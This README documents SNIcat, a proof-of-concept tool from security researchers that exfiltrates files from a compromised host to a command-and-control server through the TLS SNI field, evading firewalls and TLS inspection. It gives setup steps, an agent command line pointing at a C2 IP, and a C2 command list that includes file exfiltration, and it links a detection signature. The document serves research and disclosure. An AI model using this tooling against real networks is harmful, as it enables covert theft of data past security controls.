# SNIcat (Server Name Indication Concatenator)

<img align="right" src="/images/snicat-logo.png" alt="SNIcat" width="175x" height="200">

**SNIcat** is a proof of concept tool that performs data exfiltration, utilizing a covert channel method via. *Server Name Indication*, a **TLS Client Hello Extension**.
The tool consists of an **agent** which resides on the compromised internal host, and a **Command&Control** Server which controls the agent and gathers exfiltrated data.

The full story behind SNIcat can be found in our [blog post](https://www.mnemonic.no/blog/introducing-snicat)

## Disclaimer

SNIcat has been tested on macOS and a variety of linux distributions.
Even though it can be easily ported, there is currently no Windows version, as this is just a PoC tool.

The exfiltration method does not work with explicit proxies, due to the use of HTTP CONNECT, and not TLS Client Hello, when connecting via an explicit proxy.<br/>
SNIcat might not work with products and software versions that we haven’t tested, but that does not mean the products and/or software versions aren’t vulnerable. 

## SNIcat in action

![](/images/snicat.gif)

## Background and Scenario

We discovered a new stealthy method of data exfiltration that specifically bypasses security perimeter solutions such as web proxies, next generation firewalls (NGFW), and dedicated solutions for TLS interception and inspection. Our testing validates that this is a widespread issue that affects different types of security solutions as well as solutions from a variety of vendors. We successfully tested our technique against products from F5 Networks, Palo Alto Networks and Fortinet, and speculate that many other vendors also are susceptible. 

By using our exfiltration method SNIcat, we found that we can bypass a security perimeter solution performing TLS inspection, even when the Command & Control (C2) domain we use is blocked by common reputation and threat prevention features built into the security solutions themselves. In short, we found that solutions designed to protect users, introduced them to a new vulnerability.

We have also provided a [Suricata signature](/signatures/snicat.rules) for detecting this specific tool.

## Installation

Clone the repository: 

```bash
https://github.com/mnemonic-no/SNIcat.git
```

Install dependencies: 

```bash
pip3 install -r requirements.txt --user
```

## Initial setup

**C2**

Aquire a wildcard certificate and key from a publically trusted CA. This represents the *GOOD_CERT* and *GOOD_CERT_KEY*.<br/>
Utilise a self-signed certificate and key (not in any trust store) as a *BAD_CERT* and *BAD_CERT_KEY*.

```
(*) USAGE:      'python3 snicat_c2.py <LISTENING_PORT> <GOOD_CERT> <GOOD_CERT_KEY> <BAD_CERT> <BAD_CERT_KEY> log={on|off}'
(*) EXAMPLE:    'python3 snicat_c2_final.py 443 certs/good.pem certs/good.key certs/ssl-cert-snakeoil.pem log=off'
```

**Agent**

```
(*) USAGE:      'python3 snicat_agent.py <C2_SERVER_IP> <C2_SERVER_PORT> log={on|off}'
(*) Example:    'python3 snicat_agent.py 192.0.2.1 443 log=off'
```


## Usage

C2 Available commands

```
LIST			 - 	display all content in current folder
LS			 - 	display only files in the currenet folder
SIZE			 - 	display size of files in the currenet folder
LD			 - 	display every directory in current folder
CB			 - 	moves down to root tree folder - similar to 'cd .. '
CD <folder-id> 		 - 	moves up the specified folder
EX <file-id> 		 - 	exfiltrate the specified file
ALIVE 			 - 	check alive/dead agent
EXIT 			 - 	quit the C2 server
```
